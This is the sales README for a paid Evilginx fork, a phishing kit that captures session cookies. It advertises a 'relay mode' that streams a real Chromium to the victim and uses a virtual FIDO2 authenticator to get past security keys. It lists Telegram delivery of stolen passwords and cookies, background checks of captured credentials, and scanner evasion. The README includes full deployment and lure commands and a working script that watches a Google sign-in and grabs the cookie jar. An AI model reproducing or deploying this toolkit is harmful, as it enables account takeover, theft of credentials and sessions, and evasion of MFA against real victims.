# 🔥 EVILGINX PRO  — RELAY EDITION

## Adversary-in-the-Middle · Live Server-Side Browser · Session Hijacking · 2FA & FIDO Bypass · Telegram-Native · One-Command Docker

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.26+-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go">
  <img src="https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/Relay-Live_Browser-FF6B35?style=for-the-badge" alt="Relay">
  <img src="https://img.shields.io/badge/Guard-Deny_By_Default-6A4C93?style=for-the-badge" alt="Guard">
  <img src="https://img.shields.io/badge/Telegram-Bot_Ready-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
  <img src="https://img.shields.io/badge/Cookies-Verified_Before_Import-F4A261?style=for-the-badge" alt="Cookies">
  <img src="https://img.shields.io/badge/Deploy_Guide-36_Stages-success?style=for-the-badge" alt="Guide">
  <img src="https://img.shields.io/badge/License-BSD_3--Clause-success?style=for-the-badge" alt="License">
</p>

<p align="center">
  <b>The only Evilginx anywhere — free, paid, open or closed — that puts a REAL Chromium in front of the victim, on your server, behind a deny-by-default guard, and still hands you a cookie jar that logs in.</b>
</p>

<p align="center">
  <a href="#-pricing--contact">Pricing</a> ·
  <a href="#-whats-new-in-this-release">What's New</a> ·
  <a href="#-relay-mode-the-headline">Relay Mode</a> ·
  <a href="#-the-scoreboard-side-by-side">Scoreboard</a> ·
  <a href="#-quick-start">Quick Start</a> ·
  <a href="#-cookie-import-the-part-everyone-gets-wrong">Cookie Import</a> ·
  <a href="#-troubleshooting">Troubleshooting</a> ·
  <a href="#-faq">FAQ</a>
</p>

---

## 💬 Pricing & Contact

**One-time licence. Source included. A fraction of what the closed binary costs.**

| | |
|:--|:--|
| **Price** | On request — significantly below the ~$2,000 commonly quoted for the closed Pro binary, and it does things Pro cannot do |
| **What you get** | Full repo access, the 36-stage deployment guide, both working relay phishlets, the validator, the patcher, the jar converter, and a working deployment on your own VPS |
| **Support** | Deployment help on Telegram while you get your first capture. You are not left with a README and a shrug |
| **Updates** | Pushed to the repo you have access to |
| **Licence** | BSD 3-Clause. Read every line, patch every line |

<p align="center">
  <b>Telegram: <a href="https://t.me/officialmonsterz">@officialmonsterz</a></b> · <b>Email: shapads@tutamail.com</b> · <b>GitHub: <a href="https://github.com/officialmonsterz">officialmonsterz</a></b>
</p>

<p align="center">
  Message with your use case (target type, tenant or consumer, how many operators) and you get a straight answer and a price the same day. No sales call, no seat maths, no cloud lock-in.
</p>

---

> **Two ways to phish, one codebase.** Proxy mode rewrites the real site and hides your domain. **Relay mode** runs a real Chrome on your VPS and streams it to the victim's tab. Proxy mode is lighter and cheaper. Relay mode beats conditional access, device binding, and anything that fingerprints a rewritten DOM — because nothing is rewritten. The victim is looking at a genuine browser talking to a genuine origin.

---

## 🆕 What's New in This Release

This release adds the one capability nobody else in the space has, at any price, and makes it deployable by one person, first try, with no guessing.

### 🖥️ 1. Relay Mode — a real browser, on your box, in the victim's tab

A phishlet can now declare a `relay` block. When it does, evilginx stops proxying that host and instead:

- opens an **isolated incognito Chromium** on the Chrome sidecar
- streams JPEG frames to the victim's browser over a **WebSocket**
- feeds their mouse, wheel, keyboard and paste straight into the page
- installs a **virtual FIDO2 authenticator** so a hardware-key prompt never strands the flow
- captures the full cookie jar the instant the script declares done, and writes it to disk

The victim sees a real Google or Microsoft page. They type into a real browser. Their own 2FA completes against the real origin. You get a session that was minted for a browser that still exists.

### 🛡️ 2. A guard proxy Chrome cannot escape

The relayed browser is launched pointed at `127.0.0.1:18555`. Every request is resolved and judged **before a socket opens**:

- deny-by-default over loopback, RFC1918, link-local, CGNAT, multicast and reserved ranges
- so a page can never SSRF your `169.254.169.254` metadata endpoint
- host allow/deny patterns, CIDR allow/deny, and country rules from a longest-prefix table
- **allow always wins** over deny
- rule files parse strictly, with line numbers, and refuse to boot on a typo

### 🎛️ 3. Per-phishlet control of the browser

Width, height, JPEG quality, frame rate, wall-clock timeout, locale, timezone, user agent and debug logging are all per phishlet, validated at load time, with sane environment defaults behind them.

### 🧪 4. goja script sandbox with humanised input

Relay scripts run in a `goja` VM with an interruptible deadline. The binding surface includes curved-path mouse movement, uneven scroll steps and randomised typing delays — so the browser behaves like a hand, not a script.

### 🩹 5. Everything from the previous release, carried forward

Phishlet validator, phishlet patcher, cookie converter, the repaired `office365` phishlet, `setBodyAndLength`, `setRequestHost`, `ClaimRedirect`, the session reaper, the persistent export path, atomic exports, locked proxy config, and the `pl2` shadow fix.

### 📖 6. A 36-stage deployment guide

[DOCKERDEPLOYMENT.md](DOCKERDEPLOYMENT.md) — empty VPS to live capture. Every stage has the command, the output you must see, a per-symptom fix table, and a stop-check. It includes the guard proof, the Chrome proof, the typing test, and the noVNC tunnel. Written so the person who has never seen evilginx can follow it, and the person who has can audit it.

---

## 📋 Table of Contents

- [Pricing & Contact](#-pricing--contact)
- [What's New](#-whats-new-in-this-release)
- [Relay Mode — the headline](#-relay-mode-the-headline)
- [Relay or Proxy?](#-relay-or-proxy)
- [Why This Fork Wins](#-why-this-fork-wins)
- [The Scoreboard](#-the-scoreboard-side-by-side)
- [What Is Evilginx2?](#-what-is-evilginx2)
- [Architecture](#-architecture)
- [Feature Deep Dive](#-feature-deep-dive)
- [Quick Start](#-quick-start)
- [Ports & Exposure](#-ports--exposure)
- [Environment Variables](#-environment-variables)
- [Relay Reference](#-relay-reference)
- [Guard Rules](#-guard-rules)
- [Phishlet Tooling](#-phishlet-tooling)
- [Web Interfaces & API](#-web-interfaces--api)
- [Telegram Setup](#-telegram-setup)
- [Cookie Import — the part everyone gets wrong](#-cookie-import-the-part-everyone-gets-wrong)
- [DOM Injection Guide](#-dom-injection-guide)
- [rewrite_urls Guide](#-rewrite_urls-guide)
- [Proxies Guide](#-proxies-guide)
- [Operations Runbook](#-operations-runbook)
- [Bot Protection & OPSEC](#-bot-protection--opsec)
- [Commands Reference](#-commands-reference)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [Credits](#-credits)
- [Legal Notice](#-legal-notice)

---

# 🖥️ Relay Mode — the headline

Proxy mode has a ceiling, and it is not a bug you can patch. A rewritten DOM is still a rewritten DOM. Conditional Access policies that demand a compliant device, an attested browser, or a managed extension can tell. Some origins simply refuse to complete a sign-in through a rewriting proxy.

Relay mode removes the rewrite from the equation.

```
PROXY MODE                         RELAY MODE
─────────────────────────────      ─────────────────────────────
origin ⇄ evilginx ⇄ victim          origin ⇄ Chromium ⇄ guard ⇄ VPS
HTML rewritten in flight            frames to the victim's canvas
sub_filters must match              nothing to match
DOM looks proxied                   DOM is genuine
light: a few MB per visitor         heavy: a browser per visitor
```

### The flow, end to end

```
victim opens https://rl.yourdomain.store/
        │
        ▼
  httpsWorker sees a relay phishlet on the SNI
        │
        ▼
  serveRelayConn → one-shot listener → http.Server
        │                              (this is the only way
        │                               a WebSocket can hijack)
        ▼
  GET /            → embedded viewer page, canvas + status bar
  GET /__relay/start → manager.Start() → new incognito Chromium
  GET /__relay/ws    → upgrader hijacks, frames flow down,
                        input flows up
        │
        ▼
  script drives the flow, watching for email → password → 2FA
  failFido() installs a virtual authenticator so a security key
  prompt resolves itself and the victim stays on the page
        │
        ▼
  page.done() → cookies collected → data/relay/<sid>/cookies.json
                cookies.txt · session.json
        │
        ▼
  viewer shows "Signed in. You can close this tab."
```

### What lands on disk

```
data/relay/<sid>/
├── cookies.json    Cookie-Editor array, ready to import
├── cookies.txt     Netscape jar, ready for curl
└── session.json    phishlet, host, lure code, status, timestamps
```

All three are `0600` inside a `0700` directory.

### The FIDO problem, solved

Half of modern consumer sign-ins end at "insert your security key". A proxied flow just stops there. The relay binding calls `WebAuthn.addVirtualAuthenticator` with a CTAP2 internal authenticator and automatic presence simulation, so the origin is satisfied and the victim never leaves the page.

### Why the guard is not optional

A relayed browser is a browser you do not control the navigation of. Without a guard it can reach your own loopback services, your private network, and — on any cloud — the instance metadata endpoint that hands out credentials. The guard sits in front of all of it:

```bash
curl -s -o /dev/null -w "%{http_code}\n" --proxy http://127.0.0.1:18555 http://example.com/        # 200
curl -s -o /dev/null -w "%{http_code}\n" --proxy http://127.0.0.1:18555 http://169.254.169.254/    # 403
curl -s -o /dev/null -w "%{http_code}\n" --proxy http://127.0.0.1:18555 http://10.0.0.1/           # 403
```

If the metadata call returns `200`, the guard is down and traffic went direct. Treat that as a failed deployment.

---

# ⚖️ Relay or Proxy?

| Situation | Use |
|:--|:--|
| Microsoft 365 work tenant, Conditional Access on | **Relay** |
| Google Workspace with device trust | **Relay** |
| Origin fights `sub_filters` after every release | **Relay** |
| Security-key / passkey prompt in the flow | **Relay** |
| You need 20+ concurrent victims on a small VPS | Proxy |
| Consumer site with a stable DOM | Proxy |
| You want the address bar to show your domain only | Proxy |
| You are testing a new phishlet for the first time | Proxy, then relay |

Rule of thumb: **relay when the origin is hostile, proxy when it is not.** Every relay session is a Chromium process; budget roughly 200–400 MB per concurrent session and add RAM before you add traffic.

---

# 🏆 Why This Fork Wins

The original Evilginx2 has been untouched for years. Pro costs money and ships as a closed binary you cannot read or patch. Other forks bolt one or two features onto a frozen core. This fork rebuilt the pipeline end to end — and then went further than Pro by putting a live browser where Pro still only rewrites HTML.

### The three honest claims

1. **You get Pro's proxy-side features without paying Pro money or trusting a binary.** DOM injection, `rewrite_urls`, and multi-scope tunnelling proxies, in auditable Go.
2. **You get things Pro does not have.** A live relayed browser, a deny-by-default egress guard, Telegram delivery of the full cookie file, a completeness verdict on every capture, a jar converter, a phishlet validator, one-command Docker, automatic backups, and a retention cleaner.
3. **You can read every line, and the person who wrote it will answer you.**

### What Pro is still genuinely better at

| | Pro | This fork |
|:--|:--|:--|
| Point-and-click replay workspace | ✅ | Import the jar — seconds, but not built in |
| TLS-fingerprint (JA3/JA4) bot filtering | ✅ | UA-signature filter, 40+ signatures |
| Phishlet cloud marketplace | ✅ | Community phishlets, YAML import from the panel |

That is the whole list. Three items, and the first one costs you a two-second import.

---

# 💰 What It Costs, Side by Side

Figures for Pro are the ones commonly quoted in the community — confirm current pricing with Kuba before quoting them yourself.

| | Original (kgretzky) | Evilginx Pro | xvirgnia | Kit repos | **This Fork** |
|:--|:--:|:--:|:--:|:--:|:--:|
| **Price** | Free | **~$2,000+ licence** | Free / varies | $30–$150 per kit | **A fraction of Pro, one-time** |
| **Source included** | ✅ | ❌ closed binary | ✅ | mixed | ✅ |
| **Patches accepted** | ❌ frozen years | ❌ | ✅ | ❌ | ✅ |
| **Deployment help** | forum | vendor support | ad hoc | ad hoc | **direct on Telegram** |
| **Live relayed browser** | ❌ | ❌ | ❌ | ❌ | ✅ **only here** |
| **Egress guard** | ❌ | ❌ | ❌ | ❌ | ✅ **only here** |
| **Cost of the thing that actually beats Conditional Access** | n/a | n/a | n/a | n/a | **included** |
| **Recurring fee** | none | subscription | none | none | none |
| **Cloud lock-in** | none | cloud option | none | none | none |

**Read that column honestly:** the two capabilities that solve modern MFA and device-trust defences are not in the free project, are not in the $2,000 product, and are not in the kits. They are here, in a repo you can diff.

---

# 📊 The Scoreboard (side by side)

### vs. Original Evilginx2 (open source, frozen)

| Capability | Original | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| AiTM reverse proxy | ✅ | ✅ | tie |
| **Live server-side browser (relay)** | ❌ | ✅ | **us** |
| **Egress guard with CIDR/country rules** | ❌ | ✅ | **us** |
| **Virtual FIDO2 authenticator** | ❌ | ✅ | **us** |
| Telegram notifications + cookie files | ❌ | ✅ | **us** |
| Any web panel | ❌ | ✅ two | **us** |
| DOM injection | ❌ | ✅ | **us** |
| `rewrite_urls` | ❌ | ✅ | **us** |
| Multi-scope tunnelling proxies | ❌ | ✅ | **us** |
| Cookie completeness verification | ❌ | ✅ | **us** |
| Cookie → browser converter | ❌ | ✅ | **us** |
| Phishlet validator + patcher | ❌ | ✅ | **us** |
| Bot filtering | ❌ | ✅ | **us** |
| GeoIP + VPN/country blocking | ❌ | ✅ | **us** |
| Credential validation | ❌ | ✅ | **us** |
| Backups / retention / auto-export | ❌ | ✅ all three | **us** |
| Wildcard certificates | ❌ | ✅ | **us** |
| Header stripping / URL rewriting / CSS randomisation | ❌ | ✅ | **us** |
| Docker | ❌ | ✅ | **us** |
| Maintained | ❌ years stale | ✅ active | **us** |

**Verdict: strictly better in every row. Nothing removed.**

### vs. Evilginx Pro (closed source, paid)

| Capability | Pro | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| Core AiTM | ✅ | ✅ | tie |
| DOM-based HTML injection | ✅ | ✅ | tie |
| `rewrite_urls` | ✅ | ✅ | tie |
| Multi-scope tunnelling proxies | ✅ | ✅ | tie |
| Panels + RBAC + audit log | ✅ | ✅ | tie |
| Turnstile CAPTCHA | ✅ | ✅ | tie |
| GeoIP + VPN/country blocking | ✅ | ✅ | tie |
| Credential validation | ✅ | ✅ | tie |
| Bot filtering | ✅ TLS fingerprint | ✅ UA signatures | Pro, narrowly |
| **Live relayed browser** | ❌ | ✅ | **us** |
| **Egress guard, deny-by-default** | ❌ | ✅ | **us** |
| **Virtual FIDO2 authenticator** | ❌ | ✅ | **us** |
| Telegram delivery of cookies | ❌ | ✅ | **us** |
| Cookie completeness verdict | ❌ | ✅ | **us** |
| Open source, auditable | ❌ closed binary | ✅ | **us** |
| One-time cost, no subscription | ❌ | ✅ | **us** |
| Docker one-command | ❌ cloud-only | ✅ | **us** |
| Auto-backups + retention | partial | ✅ | **us** |
| Session replay workspace | ✅ | import the jar | Pro |
| Phishlet marketplace | ✅ | YAML import | Pro |

**Verdict: matched on every proxy feature, ahead on relay/guard/delivery/price/openness, behind on exactly two things.**

### vs. xvirgnia (Evilginx fork with a Telegram bot)

| Capability | xvirgnia | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| AiTM proxy | ✅ | ✅ | tie |
| Telegram cookie delivery | ✅ | ✅ queued, one per session, full file | **us** |
| Live relayed browser | ❌ | ✅ | **us** |
| Egress guard | ❌ | ✅ | **us** |
| Cookie completeness verdict | ❌ | ✅ | **us** |
| DOM injection / `rewrite_urls` | ❌ | ✅ | **us** |
| Multi-scope proxies | ❌ | ✅ | **us** |
| Panels + RBAC + audit log | basic | ✅ full | **us** |
| GeoIP + blocking | ❌ | ✅ | **us** |
| Credential validation | ❌ | ✅ | **us** |
| Backups / retention / auto-export | ❌ | ✅ | **us** |
| CSS randomisation / extension detection | ❌ | ✅ | **us** |
| Guided Docker deploy | partial | ✅ | **us** |

**Verdict: matches Telegram, beats it everywhere else.**

### vs. Blue Phishing Kit / Fluxette (kit repos)

| Capability | Kits | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| Captures username + password | ✅ | ✅ | tie |
| **Captures session cookie (2FA bypass)** | ❌ dies at the 2FA prompt | ✅ the entire point | **us** |
| Victim sees the real site | ❌ lookalike clone | ✅ real browser or real proxy | **us** |
| Survives target-site updates | ❌ recode the kit | ✅ phishlets + relay | **us** |
| Conditional Access / device trust | ❌ | ✅ relay mode | **us** |
| Telegram delivery incl. cookie files | partial | ✅ | **us** |
| Valid TLS per subdomain | manual / self-signed | ✅ ACME or wildcard | **us** |
| Panels, sessions table, stats | ❌/basic | ✅ two panels | **us** |
| GeoIP / bot filter / proxies | ❌ | ✅ | **us** |
| Scanner resilience | ❌ | ✅ 9 layers | **us** |

**Verdict: kits are fine for passwords. For sessions and MFA, this wins every technical axis.**

### 🏁 Overall

| | Original | Pro | xvirgnia | Kits | **This Fork** |
|:--|:--:|:--:|:--:|:--:|:--:|
| Free or one-time | free | ❌ subscription | free | per kit | ✅ one-time |
| Open source | ✅ | ❌ | ✅ | mixed | ✅ |
| AiTM session hijack | ✅ | ✅ | ✅ | ❌ | ✅ |
| Pro proxy features | ❌ | ✅ | ❌ | ❌ | ✅ |
| **Live relayed browser** | ❌ | ❌ | ❌ | ❌ | ✅ **only us** |
| **Egress guard** | ❌ | ❌ | ❌ | ❌ | ✅ **only us** |
| Telegram-native | ❌ | ❌ | ✅ | partial | ✅ most complete |
| Verified complete cookie jar | ❌ | ❌ | ❌ | ❌ | ✅ **only us** |
| Panels + RBAC + audit | ❌ | ✅ | partial | ❌ | ✅ |
| Ops features | ❌ | partial | ❌ | ❌ | ✅ all |
| One-command Docker | ❌ | ❌ | partial | ❌ | ✅ |

**The only option that is simultaneously AiTM-capable, Pro-parity on the proxy, relay-capable, guarded, Telegram-native, Docker-deployable, open source, and affordable.**

---

# 🎯 What Is Evilginx2?

Evilginx2 is an **Adversary-in-the-Middle** framework: a reverse proxy between the victim and the real site. Classic phishing grabs a username and password and then dies at the 2FA prompt. Evilginx2 grabs the **authenticated session cookie** — the "already logged in" ticket.

```
Classic phishing:   creds → 2FA prompt → WALL
AiTM with evilginx: victim logs into the REAL site (incl. their own 2FA)
                    → real site issues a session cookie → you capture it → full access
```

- ✅ No 2FA bypass needed — the victim authenticates themselves
- ✅ The session survives a later password change
- ✅ You get everything the victim can reach

---

# 🏗️ Architecture

```
                    ┌──────────────────────────────┐
   victim ──443────▶│ evilginx2                    │
                    │  DNS · TLS · router          │
                    │  ├─ proxy phishlet → goproxy │──▶ origin
                    │  └─ relay phishlet → viewer  │
                    │       │  /__relay/start      │
                    │       │  /__relay/ws         │
                    │       ▼                      │
                    │  relay.Manager ── CDP ───────┼──▶ chrome:9222
                    │  guard :18555 ◀──────────────┼────┘ (Chrome egress)
                    │  control :18556 (loopback)   │
                    └──────────────────────────────┘
                                  │
                                  ▼
                    data/relay/<sid>/cookies.json
```

Both containers run `network_mode: host`. Chrome is reachable only on loopback. The guard is the single door out.

---

# ✨ Feature Deep Dive

## 📱 Telegram Notifications

| Capability | Detail |
|:--|:--|
| Async queue | zero latency impact on the proxy |
| Full delivery | username, password, IP, UA, country, timestamp |
| Cookie file attached | ready to convert and import |
| Completeness verdict | `complete=true/false` + missing list |
| One message per session | updates append, no spam |
| Validation result | VALID / INVALID in the alert |
| Visitor arrival ping | instant, before they type anything |
| Live config | change token/chat ID in the panel, no restart |

## 📊 Two Web Interfaces

| Panel | Port | Purpose |
|:--|:--|:--|
| Web Admin | 8082 | sessions + cookie download, stats, phishlets, lures, proxies, relay status, Telegram, users, audit log. Login rate-limited |
| Simple Dashboard | 5000 | sortable/searchable sessions, CSV + JSON export, dark mode, 5s refresh |

## 🍪 Cookie Capture & Export

Every cookie from a phishlet domain is captured with value, domain, path, `Expires`, `Secure`, `HttpOnly`, `SameSite`. Auth cookies declared in the phishlet are tracked separately so completeness can be proven. Exports land in JSON and Netscape form, with a converter that produces a jar Cookie-Editor accepts.

## 🌍 GeoIP Intelligence

Country, city, ISP, ASN, lat/long, VPN/proxy/datacenter flags per session. Block with `-block-vpn` and `-block-countries RU,CN,IR,KP`.

## ✅ Credential Validation

Captured credentials are tested in the background against Microsoft 365 / Outlook / Azure and Google / Gmail. Result stored per session and shown in the alert. Tri-state, so an MFA tenant is never reported as a wrong password.

## 🤖 Bot / Crawler Filtering

40+ crawler and automation signatures turned away **before** a session exists. Bots get the decoy page, not a bare 403. In-app browsers never false-match.

## 🧠 Anti-Screenshot CSS Randomisation

Every page load gets a random hue rotation and brightness, so every load has a unique pixel fingerprint.

## 🔍 Privacy-Extension & Automation Detection

Injected JS probes for uBlock, NoScript, Ghostery, headless browsers, WebDriver, PhantomJS — and beacons the result back as a base64URL hit on `/s/<payload>.gif`.

## 🚫 Bidirectional Header Stripping + 🌐 URL Cleaning

`X-Evilginx`, `Via`, `X-Forwarded-*`, `X-Real-IP`, `X-Powered-By` stripped both ways. Full phishing URLs in HTML rewritten to relative paths.

## 🔄 Dynamic Content Spoofing

Blocked and scanner visitors get the real site's content with your domain substituted, not a blank 403.

## 🔐 Certificates

ACME built in and issued on phishlet enable. A pre-bought wildcard in `data/crt/wildcard/` covers every subdomain and keeps them off crt.sh. `test-certs` in the console retries a timeout.

---

# 🚀 Quick Start

### Requirements

Ubuntu 22.04/24.04 or Debian 12 · root · 2 GB RAM minimum, 4 GB for real relay traffic · a domain with `@`, `*`, `rl` and `gs` A-records (DNS-only, no orange cloud) · ports 22, 53/udp, 53/tcp, 80, 443, 5000, 8082 open.

```bash
# 1. SSH in
ssh root@YOUR_IP

# 2. Free port 53 without killing DNS
sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved

# 3. Firewall
ufw allow 22/tcp && ufw allow 53/udp && ufw allow 53/tcp
ufw allow 80/tcp && ufw allow 443/tcp
ufw allow 5000/tcp && ufw allow 8082/tcp && ufw enable

# 4. Docker
curl -fsSL https://get.docker.com | sh

# 5. Clone
git clone https://github.com/trustwomanaturownrisk/evilginx2.git
cd evilginx2
chmod +x entrypoint.sh telegram-watch.sh docker/chrome/start.sh validate_gsuite.py

# 6. Your .env — copy the full block from
#    DOCKERDEPLOYMENT.md stage 10, not from the table below
nano .env

# 7. Validate the shipped phishlet before anything reads it
apt install -y python3-yaml
python3 validate_phishlet.py

# 8. Build and run
docker compose build
docker compose up -d

# 9. Prove the guard is actually guarding
curl -s -o /dev/null -w "%{http_code}\n" --proxy http://127.0.0.1:18555 http://169.254.169.254/
#   → 403

# 10. Configure
docker compose attach evilginx2
#   config domain YOUR_DOMAIN
#   config ipv4 external YOUR_IP
#   blacklist unauth
#   config strip_headers on
#   phishlets hostname office365 YOUR_DOMAIN
#   phishlets enable office365
#   lures create office365
#   lures get-url 0
#   Ctrl-p Ctrl-q to detach
```

> ⚠️ Do the guard proof at step 9 **before** `blacklist unauth` at step 10. With `unauth` on, a cookieless `curl` from your own IP looks like an unauthorised visitor and gets banned — which reads as a dead service. If a later proof returns `403` or nothing, run `blacklist off` before suspecting anything else.

📖 **Full 36-stage beginner walkthrough: [DOCKERDEPLOYMENT.md](DOCKERDEPLOYMENT.md)**

### Manual

```bash
go mod tidy
go build -trimpath -ldflags="-s -w" -o evilginx .
./evilginx -dashboard 0.0.0.0:5000 -webapi-port 8082
```

---

# 🔌 Ports & Exposure

| Port | Service | Bind | Must be public |
|:--|:--|:--|:--:|
| 53/udp, 53/tcp | DNS | `0.0.0.0` | ✅ |
| 80, 443 | HTTP/HTTPS, relay viewer, relay WebSocket | `0.0.0.0` | ✅ |
| 5000 | Dashboard | `0.0.0.0` | ✅ |
| 8082 | Admin panel | `0.0.0.0` | ✅ |
| 18555 | Relay guard (Chrome egress) | `127.0.0.1` | ❌ |
| 18556 | Relay control (health, sessions, kill, frame) | `127.0.0.1` | ❌ |
| 9222 | Chrome DevTools | `127.0.0.1` | ❌ |
| 6080 | noVNC desktop | `127.0.0.1` | ❌ via SSH tunnel |

The relay WebSocket rides **443**, on the same certificate, under `/__relay/ws`. There is no second public port to open.

Watch the desktop from your laptop:

```bash
ssh -N -L 6080:127.0.0.1:6080 root@YOUR_IP
# then http://127.0.0.1:6080/vnc.html → Connect
```

---

# ⚙️ Environment Variables

All optional, all safe by default. The complete copy-paste block lives at stage 10 of the guide.

### Core

| Variable | Default | Purpose |
|:--|:--|:--|
| `TZ` | `UTC` | log timezone |
| `TG_BOT_TOKEN` | — | Telegram bot token |
| `TG_CHAT_ID` | — | Telegram chat ID |

### Panels

| Variable | Default | Purpose |
|:--|:--|:--|
| `DASHBOARD_ADDR` | `0.0.0.0:5000` | empty disables |
| `DASHBOARD_USER` | `admin` | |
| `DASHBOARD_PASS` | — | empty = **no auth** — always set one |
| `DASHBOARD_ENABLED` | `true` | `0` disables |
| `WEBAPI_PORT` | `8082` | `0` disables |
| `WEBAPI_USER` | `admin` | permanent admin user |
| `WEBAPI_PASS` | — | empty = random password printed once; the `.env` value always wins |

### Capture & export

| Variable | Default | Purpose |
|:--|:--|:--|
| `CAPTURE_ALL_COOKIES` | `true` | also capture cookies the phishlet did not declare |
| `COOKIE_EXPORT_DEFAULT_DAYS` | `30` | lifetime for cookies that arrive without one |
| `AUTO_EXPORT` | `true` | write export files |
| `AUTO_EXPORT_PATH` | `<config dir>/exports` | persistent, survives rebuilds |
| `AUTO_EXPORT_FORMAT` | `json` | `json` or `csv` |
| `AUTO_EXPORT_PER_FILE` | `true` | one file per session |

### Pro features

| Variable | Default | Purpose |
|:--|:--|:--|
| `DOM_INJECTION` | `true` | DOM engine; `0` = regex fallback |
| `REWRITE_URLS` | `false` | URL path rewriting — see the caveat |
| `CSS_RANDOMIZATION` | `false` | per-load pixel fingerprint |

### Relay

| Variable | Default | Purpose |
|:--|:--|:--|
| `RELAY_ENABLED` | `true` | master switch |
| `CHROME_URL` | `http://127.0.0.1:9222` | DevTools endpoint |
| `CHROME_PROXY` | `http://127.0.0.1:18555` | what Chrome is launched with |
| `RELAY_GUARD_ADDR` | `127.0.0.1:18555` | guard listen address |
| `RELAY_CONTROL_ADDR` | `127.0.0.1:18556` | control listen address |
| `RELAY_UPSTREAM_PROXY` | — | optional second hop behind the guard |
| `RELAY_RULES_FILE` | `<config>/allowdeny.txt` | guard rule file |
| `RELAY_COUNTRY_FILE` | `<config>/country.csv` | CIDR→country table |
| `RELAY_OUTPUT_DIR` | `<config>/relay` | capture destination |
| `SCRIPTS_DIR` | `/app/scripts` | relay scripts |
| `RELAY_IDLE_SECONDS` | `300` | kill a session with no viewer attached |
| `RELAY_MAX_SECONDS` | `900` | hard wall-clock cap |
| `RELAY_WIDTH` | `1366` | default viewport |
| `RELAY_HEIGHT` | `768` | default viewport |
| `RELAY_QUALITY` | `70` | default JPEG quality |
| `RELAY_MAXFPS` | `12` | default frame rate cap |
| `RELAY_LANG` | `en-US` | default `Accept-Language` |
| `RELAY_TIMEZONE` | — | default `Emulation.setTimezoneOverride` |
| `RELAY_USER_AGENT` | — | default UA override |
| `RELAY_DEBUG` | `false` | log every relay status line |

### Ops

| Variable | Default | Purpose |
|:--|:--|:--|
| `BOT_FILTER` | `true` | crawler filtering |
| `VISITOR_ALERTS` | `true` | instant arrival ping |
| `SESSION_MEMORY_HOURS` | `2` | keep a finished session in RAM |
| `SESSION_RETENTION_DAYS` | `0` (off) | delete DB sessions older than N days |
| `BACKUP_ENABLED` | `true` | DB + config backups |
| `BACKUP_INTERVAL_HOURS` | `6` | cadence |
| `BACKUP_KEEP` | `10` | copies retained |

> ⚠️ After editing `.env` run `docker compose up -d`. A plain `restart` never re-reads `.env`.

> ⚠️ `AUTO_EXPORT_PATH` and `RELAY_OUTPUT_DIR` must resolve **inside** `/home/evilginx/.evilginx/`. Anything off-volume vanishes on rebuild.

---

# 🧩 Relay Reference

### The phishlet block

```yaml
relay:
  enabled: true
  script: "relay-gmail"          # required, file name without .js in SCRIPTS_DIR
  page: "relay"                  # viewer template name
  width: 1366                    # 320–3840
  height: 768                    # 320–2160
  quality: 70                    # 10–100
  maxfps: 12                     # 1–30
  timeout: 900                   # seconds, >= 30
  lang: "en-US"
  timezone: "America/New_York"
  user_agent: "Mozilla/5.0 …"
  debug: false
```

Every value is range-checked at load. An out-of-range number is ignored and the environment default applies. A missing `script` is a hard load error. `enabled: false` keeps the block but turns the phishlet back into a proxy.

### Viewer paths

| Path | Method | Purpose |
|:--|:--|:--|
| `/` | GET | viewer page (canvas, progress bar, status line) |
| `/__relay/start` | GET | opens the browser, returns `{sid, ws}` |
| `/__relay/ws` | WS | frames down, input up |
| `/__relay/frame` | GET | single JPEG, for thumbnails |
| `/__relay/health` | GET | `{ok, sessions, guard}` |

### Control server (`127.0.0.1:18556`)

| Path | Purpose |
|:--|:--|
| `/health` | `{ok, sessions, chrome}` |
| `/sessions` | JSON session list |
| `/kill/<id>` | terminate one session |
| `/frame/<id>` | latest JPEG for one session |

### Script bindings

Scripts run in `goja` with a hard interrupt. `page` is the binding object.

| Binding | Purpose |
|:--|:--|
| `goto(url)` | http/https only, waits for load |
| `url()` · `title()` | current location |
| `exists(sel)` | element present |
| `wait(sel, ms)` | block until present |
| `click(sel)` · `move(x,y)` · `scroll(x,y,dy)` | humanised pointer |
| `fill(sel,v)` · `clear(sel)` · `keys(s)` · `press(k)` | input |
| `text(sel)` · `eval(js)` | read |
| `cookies()` | current jar as objects |
| `grab()` | hand the jar to the session |
| `failFido()` | install the virtual authenticator |
| `status(msg)` · `log(msg)` · `fail(msg)` · `done()` | flow control |
| `sleep(ms)` · `idle()` | pacing |

Plus a prelude: `waitAny`, `waitGone`, `typeSlow`. Two globals are pre-set: `ENV_EMAIL`, `ENV_PASSWORD`.

### A working script, in full

```javascript
var EMAIL_SEL = 'input[type="email"]';
var PASS_SEL  = 'input[type="password"]';

function loggedIn() {
  var u = page.url();
  return u.indexOf('myaccount.google.com') >= 0 || u.indexOf('mail.google.com') >= 0;
}

function poll(pred, ms) {
  var end = Date.now() + ms;
  while (Date.now() < end) { if (pred()) { return true; } page.sleep(250); }
  return false;
}

try {
  page.goto('https://accounts.google.com/v3/signin/identifier?hl=en');
  if (!poll(function () { return page.exists(EMAIL_SEL); }, 40000)) {
    page.fail('no email field at ' + page.url());
  } else {
    page.status('waiting for email');
    poll(function () { return page.exists(PASS_SEL) || loggedIn(); }, 240000);
    page.status('waiting for password');
    poll(function () { return loggedIn(); }, 240000);
    page.failFido();
    if (poll(loggedIn, 180000)) { page.grab(); page.done(); }
    else { page.fail('2fa timed out at ' + page.url()); }
  }
} catch (e) { page.fail('script error: ' + e); }
```

### API

| Method | Endpoint | Auth | Purpose |
|:--|:--|:--|:--|
| `GET` | `/api/relay/status` | session | enabled flag, guard counters, live sessions, active rules |
| `POST` | `/api/relay/rule` | operator | `{"verb":"allow","kind":"host","value":"x.com"}` |
